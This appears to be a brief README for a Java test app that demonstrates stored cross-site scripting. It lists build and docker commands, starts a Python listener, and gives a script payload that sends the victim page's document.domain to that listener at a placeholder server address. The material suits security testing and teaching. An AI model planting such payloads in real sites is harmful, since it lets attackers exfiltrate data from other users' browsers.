# java-SXSS
Test Stored XSS

mvn package
docker-compose up
sleep 30
http://<server-ip>:8888/XSS/create

python -m SimpleHTTPServer 9000

<script>var a=new XMLHttpRequest();a.open("GET","http://<server-ip>:9000/?domain="+document.domain);a.send();</script>


http://<server-ip>:8888/XSS/insecure